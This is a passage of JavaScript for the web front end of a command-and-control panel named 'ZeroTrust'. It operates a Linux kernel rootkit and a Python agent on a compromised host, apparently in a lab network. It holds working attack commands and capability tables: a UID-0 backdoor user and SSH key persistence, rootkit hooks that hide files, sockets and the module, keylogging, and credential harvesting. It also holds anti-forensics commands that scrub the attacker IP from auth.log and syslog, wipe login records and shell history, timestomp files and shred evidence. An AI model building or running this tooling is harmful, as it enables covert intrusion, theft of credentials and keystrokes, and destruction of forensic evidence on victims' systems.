{name:'Writable Paths',severity:'medium',cat:'privesc',desc:'World-writable dirs in PATH - binary hijacking',cmd:'echo "=== writable in PATH ===" && for d in $(echo $PATH | tr ":" " "); do [ -w "$d" ] && echo "WRITABLE: $d"; done; echo "=== /tmp contents ===" && ls -la /tmp/ 2>/dev/null | head -15',data:null},
{name:'Kernel & OS Info',severity:'info',cat:'recon',desc:'Version info for exploit matching',cmd:'echo "=== kernel ===" && uname -a; echo "=== os ===" && cat /etc/os-release 2>/dev/null; echo "=== capabilities ===" && grep -i cap /proc/self/status 2>/dev/null',data:null},
{name:'Docker / Containers',severity:'info',cat:'recon',desc:'Container escape opportunities',cmd:'id | grep -q docker && echo "USER IN DOCKER GROUP"; ls -la /var/run/docker.sock 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -5; ls /.dockerenv 2>/dev/null && echo "INSIDE CONTAINER"',data:null},
];

const MITRE_DATA=[
{tactic:'Initial Access',id:'TA0001',techniques:[{id:'T1078',name:'Valid Accounts',active:true,desc:'SSH password auth for initial access',impl:'Password brute-force via SSH'},{id:'T1133',name:'External Remote Services',active:true,desc:'SSH on port 22 as entry vector',impl:'OpenSSH sshd on 192.168.122.100:22'}]},
{tactic:'Execution',id:'TA0002',techniques:[{id:'T1059.006',name:'Python',active:true,desc:'Python C2 agent executes commands',impl:'agent.py runs as PID 789'},{id:'T1106',name:'Native API',active:true,desc:'Kernel syscall manipulation via ftrace',impl:'Ftrace hooks on sys_read, sys_getdents64'},{id:'T1059.004',name:'Unix Shell',active:true,desc:'Bash execution through C2',impl:'subprocess.Popen("/bin/bash")'}]},
{tactic:'Persistence',id:'TA0003',techniques:[{id:'T1547.006',name:'Kernel Modules',active:true,desc:'LKM with auto-reload on boot',impl:'insmod kmod.ko via /etc/modules'},{id:'T1053.003',name:'Cron',active:true,desc:'Crontab ensures agent restart',impl:'@reboot + */5 watchdog cron'},{id:'T1136.001',name:'Local Account',active:true,desc:'Backdoor user with UID 0',impl:'useradd -o -u 0 sysadm'},{id:'T1098.004',name:'SSH Keys',active:true,desc:'SSH authorized_keys backdoor',impl:'Ed25519 key in /root/.ssh/authorized_keys'}]},
{tactic:'Priv Escalation',id:'TA0004',techniques:[{id:'T1068',name:'Exploitation',active:true,desc:'Running as root',impl:'Agent runs as UID 0'}]},
{tactic:'Defense Evasion',id:'TA0005',techniques:[{id:'T1014',name:'Rootkit',active:true,desc:'LKM hides all artifacts',impl:'Hooks sys_getdents64, hides from lsmod'},{id:'T1564.001',name:'Hidden Files',active:true,desc:'Files hidden from ls',impl:'sys_getdents64 filters hidden prefix'},{id:'T1070.002',name:'Clear Logs',active:true,desc:'Kernel log filtering',impl:'printk hook suppresses messages'},{id:'T1562.001',name:'Disable Tools',active:true,desc:'rmmod blocked',impl:'module_put hook prevents unload'}]},
{tactic:'Credential Access',id:'TA0006',techniques:[{id:'T1003.008',name:'Shadow File',active:true,desc:'Direct reading of /etc/shadow',impl:'cat /etc/shadow for offline cracking'},{id:'T1056.001',name:'Keylogging',active:true,desc:'Kernel-level TTY capture',impl:'Ftrace on __x64_sys_read'},{id:'T1552.004',name:'Private Keys',active:true,desc:'SSH key harvesting',impl:'Search /home/*/.ssh/'}]},
{tactic:'Discovery',id:'TA0007',techniques:[{id:'T1082',name:'System Info',active:true,desc:'OS/kernel/hardware enum',impl:'uname, /proc/cpuinfo'},{id:'T1057',name:'Process Discovery',active:true,desc:'Process listing',impl:'ps aux'},{id:'T1049',name:'Network Connections',active:true,desc:'Connection enum',impl:'ss -tnp, /proc/net/tcp'},{id:'T1046',name:'Network Scanning',active:true,desc:'Port scanning from victim',impl:'bash /dev/tcp probe'},{id:'T1497',name:'Virtualization Detection',active:true,desc:'VM/sandbox detection',impl:'CPUID + DMI + MAC OUI checks'}]},
{tactic:'Collection',id:'TA0009',techniques:[{id:'T1056.001',name:'Input Capture',active:true,desc:'Keylogger captures all input',impl:'Real-time TTY sniffer'},{id:'T1005',name:'Local Data',active:true,desc:'File download',impl:'File browser + download'},{id:'T1115',name:'Clipboard Data',active:true,desc:'X11 clipboard capture',impl:'xclip/xsel clipboard read'},{id:'T1113',name:'Screen Capture',active:true,desc:'Screenshot via X11',impl:'import/scrot screen grab'},{id:'T1040',name:'Network Sniffing',active:true,desc:'Packet capture on victim',impl:'tcpdump live capture'}]},
{tactic:'Command & Control',id:'TA0011',techniques:[{id:'T1071.001',name:'Web Protocols',active:true,desc:'WebSocket C2',impl:'Persistent WS on port 8080'},{id:'T1573.001',name:'Encrypted Channel',active:true,desc:'ChaCha20-Poly1305',impl:'AEAD encryption, nonce rotation'}]},
{tactic:'Exfiltration',id:'TA0010',techniques:[{id:'T1041',name:'Over C2 Channel',active:true,desc:'Data over encrypted WebSocket',impl:'Files, creds, keylog over C2'},{id:'T1119',name:'Auto Collection',active:true,desc:'Automated credential harvesting',impl:'Shadow, SSH keys, DB creds, tokens'}]},
{tactic:'Impact',id:'TA0040',techniques:[{id:'T1485',name:'Data Destruction',active:true,desc:'Self-destruct: remove all traces',impl:'Shred files, wipe logs, rmmod'}]},
];

const KEYLOG_DATA=[];

const PERSIST_MECHS=[
{id:1,name:'Kernel Module Auto-load',risk:'low',desc:'zroot.conf in /etc/modules-load.d/ — auto-loads LKM at boot',detail:'/etc/modules-load.d/zroot.conf',
 check:'test -f /etc/modules-load.d/zroot.conf&&echo ON||echo OFF'},
{id:2,name:'Modprobe Config',risk:'low',desc:'Module params (c2_ip, c2_port, pw_hash) saved for modprobe',detail:'/etc/modprobe.d/zroot.conf',
 check:'test -f /etc/modprobe.d/zroot.conf&&echo ON||echo OFF'},
{id:3,name:'Module in /lib/modules',risk:'low',desc:'zroot.ko copied to extra/ for depmod/modprobe',detail:'/lib/modules/$(uname -r)/extra/zroot.ko',
 check:'stat -c%s /lib/modules/`uname -r`/extra/zroot.ko 2>/dev/null&&echo ON||echo OFF'},
{id:4,name:'Crontab Respawner',risk:'medium',desc:'@reboot crontab re-insmod if module not loaded',detail:'@reboot modprobe zroot',
 check:'crontab -l 2>/dev/null|grep -q zroot&&echo ON||echo OFF'},
{id:5,name:'Backdoor User (UID 0)',risk:'high',desc:'Hidden user "sysadm" with UID 0 and known password',detail:'sysadm:x:0:0::/root:/bin/bash',
 check:'id sysadm 2>/dev/null&&echo ON||echo OFF'},
{id:6,name:'SSH Authorized Key',risk:'medium',desc:'Attacker pubkey in root authorized_keys for passwordless SSH',detail:'/root/.ssh/authorized_keys',
 check:'test -f /root/.ssh/authorized_keys&&grep -q wlkom /root/.ssh/authorized_keys 2>/dev/null&&echo ON||echo OFF'},
{id:7,name:'Module Hidden (kobject)',risk:'low',desc:'list_del + kobject_del — survives rmmod attempts',detail:'Kernel-side: always active when module loaded',
 check:'echo ON'},
];

const MODULES_DATA=[
{id:'getdents64',name:'File & PID Hiding',desc:'Hides directory entries containing "wlkom"/"zroot" + hidden PIDs from /proc',status:true,hook:'__x64_sys_getdents64 → hk_getdents64',cat:'Concealment'},
{id:'read_hook',name:'Line Filtering (read)',desc:'Filters lines with "wlkom"/"zroot" + C2 port hex from cat/dmesg/proc',status:true,hook:'__x64_sys_read → hk_read',cat:'Concealment'},
{id:'recvmsg',name:'Socket Hiding (ss/netstat)',desc:'Intercepts NETLINK_SOCK_DIAG to hide C2 connection from ss',status:true,hook:'__x64_sys_recvmsg → hk_recvmsg',cat:'Concealment'},
{id:'mod_hide',name:'Module Concealment',desc:'Removes module from linked list + sysfs kobject',status:true,hook:'list_del() + kobject_del()',cat:'Concealment'},
{id:'net_hide',name:'Network Hex Filtering',desc:'Converts C2 port/IP to hex for /proc/net/tcp line filtering',status:true,hook:'net_hide_init() — c2_port_hex + c2_ip_hex',cat:'Concealment'},
{id:'keylog_read',name:'Keylogger (sys_read)',desc:'Captures TTY (major 4) and PTY (major 136) input via read hook',status:true,hook:'__x64_sys_read (keylogger_active path)',cat:'Collection'},
{id:'keylog_kb',name:'Keylogger (keyboard)',desc:'Console keyboard capture via register_keyboard_notifier',status:true,hook:'keyboard_notifier_block',cat:'Collection'},
{id:'persist',name:'Auto-Persistence',desc:'call_usermodehelper copies module + creates boot configs',status:true,hook:'set_persistence() on init',cat:'Persistence'},
{id:'crypto',name:'ChaCha20-Poly1305',desc:'AEAD encryption for all C2 traffic — key derived from pw_hash',status:true,hook:'crypto_derive_key() — kernel crypto API',cat:'Communication'},
{id:'c2thread',name:'C2 Kthread',desc:'Kernel thread connecting to attacker on port 9999/9998',status:true,hook:'kthread_run(c2_thread_fn)',cat:'Communication'},
];

const AF_ACTIONS=[
{id:'auth',name:'Scrub Auth Logs',severity:'critical',desc:'Remove attacker IP from auth.log, btmp, lastlog',cmd:'sed -i "/192.168.122/d" /var/log/auth.log 2>/dev/null;echo OK',cat:'Log Tampering'},
{id:'syslog',name:'Clean Syslog',severity:'high',desc:'Remove attacker IP + module traces from syslog',cmd:'sed -i "/192.168.122/d" /var/log/syslog 2>/dev/null;echo OK',cat:'Log Tampering'},
{id:'kern',name:'Clear Kernel Ring Buffer',severity:'critical',desc:'Wipe dmesg + suppress future kernel messages',cmd:'dmesg -C;echo 1 > /proc/sys/kernel/printk;echo OK',cat:'Log Tampering'},
{id:'journal',name:'Vacuum Systemd Journal',severity:'high',desc:'Shrink journal to 1MB to destroy old entries',cmd:'journalctl --vacuum-size=1M 2>/dev/null;echo OK',cat:'Log Tampering'},
{id:'bash',name:'Purge Shell History',severity:'high',desc:'Empty .bash_history + .zsh_history for all users',cmd:'for f in /root/.*history /home/*/.*history; do >$f 2>/dev/null; done;echo OK',cat:'Artifact Cleanup'},
{id:'wtmp',name:'Truncate Login Records',severity:'high',desc:'Clear wtmp/btmp — removes all login history',cmd:'>/var/log/wtmp 2>/dev/null;>/var/log/btmp 2>/dev/null;echo OK',cat:'Artifact Cleanup'},
{id:'tmp',name:'Clean /tmp Artifacts',severity:'medium',desc:'Remove temp files created by C2 operations',cmd:'rm -f /tmp/.pf* /tmp/.fwd* /tmp/.ss.sh /tmp/.wlkom_* 2>/dev/null;echo OK',cat:'Artifact Cleanup'},
{id:'timestamp',name:'Timestomp Persist Files',severity:'medium',desc:'Match persistence file timestamps to /bin/ls',cmd:'touch -r /bin/ls /etc/modules-load.d/zroot.conf /etc/modprobe.d/zroot.conf 2>/dev/null;echo OK',cat:'Artifact Cleanup'},
{id:'swap',name:'Flush Caches + Swap',severity:'critical',desc:'Drop page/dentry/inode caches and cycle swap',cmd:'sync;echo 3>/proc/sys/vm/drop_caches;swapoff -a 2>/dev/null;swapon -a 2>/dev/null;echo OK',cat:'Memory Wipe'},
{id:'shred',name:'Secure Delete Evidence',severity:'medium',desc:'Shred + remove any leftover temp files',cmd:'shred -fuz /tmp/.wlkom_* /tmp/.pf* 2>/dev/null;echo OK',cat:'Memory Wipe'},
];

/* ===== STATE ===== */
let S={
  token:null, pw:null, panel:'dashboard', collapsed:false, events:[], uptime:0,
  wsUp:false, rkUp:false, rkAuth:false, rkAwait:false, rkLocked:false, rkLockSec:0,
  termLines:[], termHist:[], termHistI:-1, cwd:'/',
  klActive:false, klData:[], klAuto:false, klDumps:[], klTotalBytes:0, klSearch:'', klTab:'live',
  procSort:'cpu', procDesc:true,
  procs:[], netConns:[], netIfaces:[], netRoutes:[], netDns:[], netArp:[],
  fsTree:{}, fsExpanded:new Set(['/']), fsCwd:'/', fsHistory:[], fsView:null, fsLoading:false,
  stRes:{}, stRunning:false, persistChecking:false,
  credsLoaded:{}, credsLoading:false, credOpen:-1, credCatFilter:'all',
  mechs:PERSIST_MECHS.map(m=>({...m})),
  mods:MODULES_DATA.map(m=>({...m})),
  afDone:{}, afRunning:{}, afOutput:{},
  netTab:'connections', dnsResult:'', hostInfo:'', sniffFilter:'',
  credTab:'recon',
  survTab:'spy',
  topoHosts:[{ip:'192.168.122.1',hostname:'Gateway',type:'router',os:'Linux (KVM)',ports:[],status:'up'},{ip:'192.168.122.167',hostname:'Attacker',type:'attacker',os:'Linux',ports:[8080,9999],status:'up'},{ip:'192.168.122.146',hostname:'Victim',type:'victim',os:'Linux',ports:[22],status:'compromised'}],
  topoScan:false,
  actFilter:'all', actSearch:'',
  cmdOpen:false,
  dataLoaded:false,
  victimIP:'192.168.122.146',attackerIP:'192.168.122.167',
  // Port Scanner
  scanResults:[],scanRunning:false,scanTarget:'127.0.0.1',scanPorts:'1-1024',
  // Packet Sniffer
  sniffData:[],sniffRunning:false,sniffIface:'eth0',sniffCount:50,
  // Tunnels
  tunnels:[],tunnelRunning:false,
  // Clipboard
  clipData:[],
  // Surveillance
  survSpyData:null, survPtsList:[], survFileData:'', survAuthData:'',
  // VM Detection
  vmInfo:null,vmChecked:false,vmRunning:false,
  // Self-destruct
  selfDestructArmed:false,selfDestructDone:false,
  // Harvest
  harvestResults:{},harvestRunning:false,
};

/* ===== API ===== */
let ws=null;
function esc(s){return s==null?'':String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function fmtUp(s){const h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;return String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0')}
function sevCls(s){return{critical:'b-critical',high:'b-high',medium:'b-medium',low:'b-low',info:'b-info'}[s]||'b-info'}
function typeCls(t){return{info:'b-info',error:'b-error',warn:'b-warn',cmd:'b-cmd',rootkit:'b-rootkit',success:'b-success'}[t]||'b-info'}
function ts(){return new Date().toLocaleTimeString('en-GB',{hour12:false})}

async function apiLogin(pw){
  try{
    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});
    const d=await r.json();
    if(d.token){S.token=d.token;S.pw=pw;sessionStorage.setItem('c2token',d.token);addEv('info','Web UI authenticated');wsConnect();await pollStatus();if(S.rkAwait&&!S.rkAuth){S.panel='terminal';S.termLines.push({type:'warn',text:'[!] Rootkit password required. Type the password below.'})}render();return {ok:true}}
    return {ok:false,message:d.message||'Wrong password',locked:d.error==='locked',seconds:d.seconds||0,attempts_left:d.attempts_left}
  }catch(e){return {ok:false,message:'Connection error'}}
}

async function apiExec(cmd){
  if(!S.token)return 'Not authenticated';
  try{
    const r=await fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json','X-Token':S.token},body:JSON.stringify({cmd:cmd})});
    const d=await r.json();
    if(d.error)return 'Error: '+d.error;
    if(d.cwd)S.cwd=d.cwd;
    return d.output||'';
  }catch(e){return 'Connection error: '+e.message}
}

async function pollStatus(){
  try{
    const r=await fetch('/api/status');const d=await r.json();
    const wasAuth=S.rkAuth;const wasAwait=S.rkAwait;const wasLocked=S.rkLocked;
    S.rkUp=d.rootkit==='connected';S.rkAuth=d.authenticated;S.rkAwait=d.awaiting_password;
    S.rkLocked=d.rk_locked||false;S.rkLockSec=d.rk_lock_remaining||0;
    if(S.rkLocked&&!window._rkLockTimer){
      window._rkLockTimer=setInterval(()=>{S.rkLockSec--;if(S.rkLockSec<=0){S.rkLocked=false;clearInterval(window._rkLockTimer);window._rkLockTimer=null;pollStatus()}safeRender()},1000);
    }
    updateStatus();
    if(S.rkAuth&&!S.dataLoaded){S.dataLoaded=true;setTimeout(()=>{refreshAll().then(()=>safeRender())},300)}
    if(wasAuth!==S.rkAuth||wasAwait!==S.rkAwait||wasLocked!==S.rkLocked)safeRender();
  }catch(e){}
}

function wsConnect(){
  if(ws)return;
  const p=location.protocol==='https:'?'wss:':'ws:';
  ws=new WebSocket(p+'//'+location.host+'/ws');
  ws.onopen=()=>{S.wsUp=true;updateStatus();addEv('info','WebSocket connected')};
  ws.onmessage=(e)=>{
    try{
      const d=JSON.parse(e.data);
      S.events.push({time:d.ts||ts(),type:d.type||'info',msg:d.msg||''});
      if(d.type==='error')toast(d.msg,'error');
      else if(d.type==='warn')toast(d.msg,'warn');
      if(d.msg){
        const m=d.msg;
        if(m.includes('Password required')||m.includes('AUTH_REQUIRED')){S.rkAwait=true;S.rkLocked=false;S.termLines.push({type:'warn',text:m});safeRender()}
        else if(m.includes('Authenticated successfully')){S.rkAuth=true;S.rkAwait=false;S.rkLocked=false;S.termLines.push({type:'info',text:m});if(!S.dataLoaded){S.dataLoaded=true;setTimeout(()=>{refreshAll().then(()=>safeRender())},300)}else{safeRender()}}
        else if(m.includes('Locked for')){S.rkLocked=true;const mx=m.match(/(\d+)s/);if(mx)S.rkLockSec=parseInt(mx[1]);if(!window._rkLockTimer){window._rkLockTimer=setInterval(()=>{S.rkLockSec--;if(S.rkLockSec<=0){S.rkLocked=false;S.rkAwait=true;clearInterval(window._rkLockTimer);window._rkLockTimer=null;pollStatus()}safeRender()},1000)}S.termLines.push({type:'error',text:m});safeRender()}
        else if(m.includes('attempt(s) remaining')){S.termLines.push({type:'error',text:m});safeRender()}
        else if(m.includes('Password sent')||m.includes('Auto-retry')||m.includes('Password saved')||m.includes('reconnecting')){S.termLines.push({type:'warn',text:m});safeRender()}
        else if(m.includes('Rootkit connected')){S.termLines.push({type:'info',text:m});safeRender()}
        else if(m.includes('Rootkit disconnected')){S.rkUp=false;S.rkAuth=false;S.rkAwait=false;S.termLines.push({type:'error',text:m});safeRender()}
      }
      else if(S.panel==='activity')safeRender();
      updateStatus();
    }catch(ex){}
  };
  ws.onclose=()=>{S.wsUp=false;ws=null;updateStatus();setTimeout(wsConnect,3000)};
  ws.onerror=()=>{try{ws.close()}catch(e){}};
}
function wsSend(action,value,extra){if(ws&&ws.readyState===1)ws.send(JSON.stringify({action,value,...(extra||{})}))}

function addEv(type,msg){S.events.push({time:ts(),type,msg})}

/* ===== REAL DATA FETCHING ===== */
async function refreshSysInfo(){
  try{
    const [hn,osrel,kern,arch,cpui,mem,disk,iface,upt,load]=await Promise.all([
      apiExec('hostname'),
      apiExec('cat /etc/os-release 2>/dev/null|grep PRETTY_NAME|cut -d\\" -f2'),
      apiExec('uname -r'),
      apiExec('uname -m'),
      apiExec('grep "model name" /proc/cpuinfo 2>/dev/null|head -1|sed "s/.*: //"'),
      apiExec('free -m|grep Mem'),
      apiExec('df -h /|tail -1'),
      apiExec('ip -4 addr show scope global 2>/dev/null|grep inet|head -1'),
      apiExec('uptime -p 2>/dev/null||uptime'),
      apiExec('cat /proc/loadavg 2>/dev/null|cut -d" " -f1-3'),
    ]);
    function ok(v){return v&&!v.startsWith('Error:')}
    if(!ok(hn)){await pollStatus();safeRender();return}
    SYSTEM.hostname=hn.trim();
    if(ok(osrel))SYSTEM.os=osrel.trim();
    if(ok(kern))SYSTEM.kernel=kern.trim();
    if(ok(arch))SYSTEM.arch=arch.trim();
    if(ok(cpui))SYSTEM.cpu=cpui.trim();
    if(ok(mem)){
      const mp=mem.trim().split(/\s+/);
      if(mp.length>=3){SYSTEM.ramTotal=parseInt(mp[1])||SYSTEM.ramTotal;SYSTEM.ramUsed=parseInt(mp[2])||SYSTEM.ramUsed;SYSTEM.ramFree=parseInt(mp[3])||SYSTEM.ramFree}
    }
    if(ok(disk)){
      const dp=disk.trim().split(/\s+/);
      if(dp.length>=5){SYSTEM.diskTotal=dp[1];SYSTEM.diskUsed=dp[2];SYSTEM.diskPct=parseInt(dp[4])||SYSTEM.diskPct}
    }
    if(ok(iface)){const m=iface.match(/inet\s+([\d.]+)/);if(m)SYSTEM.ip=m[1]}
    if(ok(upt))SYSTEM.uptimeSys=upt.trim();
    if(ok(load))SYSTEM.loadAvg=load.trim();
    const mac=await apiExec('ip link show 2>/dev/null|grep ether|head -1|awk "{print \\$2}"');
    if(ok(mac))SYSTEM.mac=mac.trim();
    const gw=await apiExec('ip route show default 2>/dev/null|awk "{print \\$3}"');
    if(ok(gw))SYSTEM.gateway=gw.trim();
    const pid=await apiExec('cat /tmp/.wlkom/agent.pid 2>/dev/null||pgrep -f agent.py|head -1');
    if(ok(pid)&&pid.trim())SYSTEM.implantPid=parseInt(pid.trim())||SYSTEM.implantPid;
    const cores=await apiExec('nproc 2>/dev/null');
    if(ok(cores))SYSTEM.cores=parseInt(cores.trim())||SYSTEM.cores;
    addEv('info','System info refreshed');
  }catch(e){addEv('error','Failed to refresh system info: '+e.message)}
}

async function refreshProcesses(){
  try{
    const out=await apiExec('ps aux --no-headers 2>/dev/null||ps aux|tail -n+2');
    if(!out||out.trim().length<5)return;
    const procs=[];
    out.split('\n').filter(l=>l.trim()).forEach(l=>{
      const p=l.trim().split(/\s+/);
      if(p.length>=11){
        const pid=parseInt(p[1]);if(isNaN(pid))return;
        procs.push({pid,user:p[0],cpu:parseFloat(p[2])||0,mem:parseFloat(p[3])||0,vsz:p[4]||'0',rss:p[5]||'0',stat:p[7]||'S',start:p[8]||'',time:p[9]||'',cmd:p.slice(10).join(' ')});
      }
    });
    if(procs.length>0){S.procs=procs;addEv('info','Processes: '+procs.length+' total, CPU '+procs.reduce((s,p)=>s+p.cpu,0).toFixed(1)+'%')}
  }catch(e){}
}

async function refreshNetConns(){
  try{
    const out=await apiExec('ss -tunpa 2>/dev/null||netstat -tunpa 2>/dev/null');
    if(!out)return;
    const conns=[];
    out.split('\n').filter(l=>l.trim()&&!l.startsWith('State')&&!l.startsWith('Proto')&&!l.startsWith('Netid')).forEach(l=>{
      const p=l.trim().split(/\s+/);
      if(p.length>=5){
        let proto='tcp',st=p[0],local=p[3]||'',remote=p[4]||'';
        if(st==='udp'||st==='tcp'){proto=st;st=p[1];local=p[4]||'';remote=p[5]||''}
        const procM=l.match(/users:\(\("([^"]+)",pid=(\d+)/);
        const proc=procM?(procM[1]+'/'+procM[2]):'';
        if(local)conns.push({proto,local,remote:remote==='*:*'?'':remote,state:st,proc});
      }
    });
    if(conns.length>0){S.netConns=conns;addEv('info','Network: '+conns.length+' connections')}
  }catch(e){}
}

async function refreshNetIfaces(){
  try{
    const out=await apiExec('ip -d link show 2>/dev/null && echo "---ADDR---" && ip -br addr show 2>/dev/null');
    if(!out)return;
    const parts=out.split('---ADDR---');
    const linkData={};
    if(parts[0]){
      let cur=null;
      parts[0].split('\n').forEach(l=>{
        const m=l.match(/^\d+:\s+(\S+?)[@:].*mtu\s+(\d+)/);
        if(m){cur=m[1];linkData[cur]={mtu:m[2],mac:'',rxb:'0',txb:'0',state:'DOWN'}}
        if(cur){
          const mac=l.match(/link\/ether\s+([0-9a-f:]+)/);if(mac)linkData[cur].mac=mac[1];
          const st=l.match(/state\s+(\w+)/);if(st)linkData[cur].state=st[1];
        }
      });
    }
    const ifaces=[];
    if(parts[1]){
      parts[1].split('\n').filter(l=>l.trim()).forEach(l=>{
        const p=l.trim().split(/\s+/);
        if(p.length>=2){
          const name=p[0];const ld=linkData[name]||{};
          ifaces.push({name,state:p[1],ip:p.slice(2).join(', ')||'N/A',mac:ld.mac||'',mtu:ld.mtu||''});
        }
      });
    }
    if(ifaces.length>0)S.netIfaces=ifaces;
    const stats=await apiExec('cat /proc/net/dev 2>/dev/null');
    if(stats){
      stats.split('\n').forEach(l=>{
        const m=l.match(/^\s*(\w+):\s*(\d+)\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+(\d+)/);
        if(m){const ifc=S.netIfaces.find(i=>i.name===m[1]);if(ifc){ifc.rxb=m[2];ifc.txb=m[3]}}
      });
    }
  }catch(e){}
}

async function refreshNetRoutes(){
  try{
    const out=await apiExec('ip route show 2>/dev/null||route -n 2>/dev/null');
    if(!out)return;
    const routes=[];
    out.split('\n').filter(l=>l.trim()).forEach(l=>{
      const def=l.match(/^default\s+via\s+([\d.]+)\s+dev\s+(\w+)(?:\s+.*metric\s+(\d+))?/);
      if(def){routes.push({dest:'default',gateway:def[1],iface:def[2],metric:def[3]||'0',scope:''});return}
      const rt=l.match(/^([\d./]+)\s+dev\s+(\w+)(?:\s+.*via\s+([\d.]+))?(?:\s+.*metric\s+(\d+))?(?:\s+.*scope\s+(\w+))?/);
      if(rt)routes.push({dest:rt[1],gateway:rt[3]||'direct',iface:rt[2],metric:rt[4]||'0',scope:rt[5]||''});
    });
    if(routes.length>0)S.netRoutes=routes;
  }catch(e){}
}

async function refreshNetDns(){
  try{
    const out=await apiExec('cat /etc/resolv.conf 2>/dev/null');
    if(!out)return;
    S.netDns=[];
    out.split('\n').forEach(l=>{
      const m=l.match(/^nameserver\s+([\d.]+)/);if(m)S.netDns.push(m[1]);
    });
  }catch(e){}
}

async function refreshNetArp(){
  try{
    const out=await apiExec('ip neigh show 2>/dev/null||arp -an 2>/dev/null');
    if(!out)return;
    S.netArp=[];
    out.split('\n').filter(l=>l.trim()).forEach(l=>{
      const m=l.match(/^([\d.]+)\s+dev\s+(\w+)\s+lladdr\s+([0-9a-f:]+)\s+(\w+)/i);
      if(m)S.netArp.push({ip:m[1],iface:m[2],mac:m[3],state:m[4]});
      else{const m2=l.match(/\(([\d.]+)\)\s+at\s+([0-9a-f:]+)\s.*on\s+(\w+)/i);if(m2)S.netArp.push({ip:m2[1],iface:m2[3],mac:m2[2],state:'REACHABLE'})}
    });
  }catch(e){}
}

async function refreshNetAll(){
  await Promise.all([refreshNetConns(),refreshNetIfaces(),refreshNetRoutes(),refreshNetDns(),refreshNetArp()]);
  renderPanel();
}

function parseLsOutput(out,path){
  const entries=[];
  if(!out||out.startsWith('Error'))return entries;
  out.split('\n').filter(l=>l.trim()&&!l.startsWith('total')).forEach(l=>{
    const p=l.trim().split(/\s+/);
    if(p.length>=9){
      const perms=p[0];const owner=p[2];const group=p[3];const size=p[4];
      const name=p.slice(8).join(' ');
      if(name==='.'||name==='..')return;
      const isDir=perms.startsWith('d');const isLink=perms.startsWith('l');
      const mod=p[5]+' '+p[6]+' '+p[7];
      entries.push({name,fp:path==='/'?'/'+name:path+'/'+name,isDir,isLink,size,perms,owner,mod});
    }
  });
  return entries;
}
async function fsLoadDir(path){
  const out=await apiExec('ls -la '+path+' 2>&1');
  const entries=parseLsOutput(out,path);
  S.fsTree[path]=entries;
  return entries;
}

async function refreshAll(){
  if(!S.rkAuth)return;
  addEv('info','Refreshing all data from target...');
  await Promise.all([refreshSysInfo(),refreshProcesses(),refreshNetConns(),refreshNetIfaces(),fsLoadDir('/')]);
  S.fsExpanded.add('/');
  if(typeof safeRender==='function')safeRender();
  toast('Data refreshed from target','info');
}

/* ===== TOAST ===== */
let toastN=0;
function toast(msg,type){
  type=type||'info';const id=++toastN;
  const st=document.getElementById('toasts');if(!st)return;
  const el=document.createElement('div');el.className='toast t-'+type;el.id='t'+id;
  el.innerHTML='<span class="t-msg">'+esc(msg)+'</span><button class="t-close" onclick="rmToast('+id+')" style="background:none;border:none;color:var(--t4);cursor:pointer">'+I.xmark+'</button>';
  st.appendChild(el);
  setTimeout(()=>{el.classList.add('out');setTimeout(()=>el.remove(),250)},3500);
}
function rmToast(id){const el=document.getElementById('t'+id);if(el){el.classList.add('out');setTimeout(()=>el.remove(),250)}}

/* ===== RENDER ENGINE ===== */
function render(){
  const app=document.getElementById('app');
  if(!S.token){app.innerHTML=renderLogin();setupLogin();return}
  app.innerHTML=renderApp();renderPanel();setupApp();
}

function renderLogin(){
  return '<div class="login-wrap"><div class="login-box">'+
    '<div style="margin-bottom:12px"><div class="logo-mark" style="width:48px;height:48px;font-size:18px;display:inline-flex;margin-bottom:12px">ZT</div></div>'+
    '<h1>ZeroTrust</h1><div class="sub">Command &amp; Control Platform</div>'+
    '<form id="lf"><input id="lpw" type="password" placeholder="Platform password" autocomplete="off" autofocus>'+
    '<button type="submit">Authenticate</button></form>'+
    '<div class="err" id="lerr"></div>'+
    '<div class="crypto"><span class="st-dot g" style="width:6px;height:6px;border-radius:50%;background:var(--green);display:inline-block"></span> ChaCha20-Poly1305 &middot; Dual-Gate Auth &middot; v5.0</div>'+
    '</div></div>';
}

function setupLogin(){
  const f=document.getElementById('lf');
  if(f)f.onsubmit=async(e)=>{
    e.preventDefault();
    const btn=f.querySelector('button');
    const err=document.getElementById('lerr');
    const pw=document.getElementById('lpw').value;
    if(!pw){err.textContent='Enter a password';return}
    btn.disabled=true;btn.textContent='Authenticating...';
    const res=await apiLogin(pw);
    if(res.ok)return;
    err.textContent=res.message;
    err.style.color='var(--red)';
    document.getElementById('lpw').value='';
    document.getElementById('lpw').focus();
    btn.disabled=false;btn.textContent='Authenticate';
    if(res.locked){
      btn.disabled=true;
      let sec=res.seconds;
      const iv=setInterval(()=>{sec--;if(sec<=0){clearInterval(iv);btn.disabled=false;btn.textContent='Authenticate';err.textContent=''}else{btn.textContent='Locked ('+sec+'s)';err.textContent='Too many failed attempts. Wait '+sec+'s'}},1000);
    }
  }
}

function renderApp(){
  const navSections=[
    {s:'Operations',items:[{id:'dashboard',icon:'dashboard',l:'Dashboard'},{id:'terminal',icon:'terminal',l:'RTR Terminal'},{id:'filesystem',icon:'folder',l:'File System'}]},
    {s:'Monitoring',items:[{id:'processes',icon:'cpu',l:'Processes'},{id:'network',icon:'network',l:'Network'}]},
    {s:'Intelligence',items:[{id:'keylogger',icon:'keyboard',l:'Keylogger'},{id:'credentials',icon:'key',l:'Credentials'},{id:'surveillance',icon:'camera',l:'Surveillance'},{id:'recon',icon:'monitor',l:'VM Detection'}]},
    {s:'Offensive',items:[{id:'tunnels',icon:'link',l:'Port Forward'}]},
    {s:'System',items:[{id:'stealth',icon:'shield',l:'Stealth Audit'},{id:'persistence',icon:'anchor',l:'Persistence'},{id:'antiforensics',icon:'eraser',l:'Anti-Forensics'},{id:'modules',icon:'puzzle',l:'Modules'},{id:'activity',icon:'list',l:'Activity Log'},{id:'selfdestruct',icon:'skull',l:'Self-Destruct'}]},
    {s:'Admin',items:[{id:'settings',icon:'gear',l:'Settings'}]},
  ];
  let sb='<div class="sidebar"><div class="logo"><div class="logo-mark">ZT</div><span class="logo-text">ZeroTrust</span></div><div class="nav">';
  navSections.forEach(sec=>{
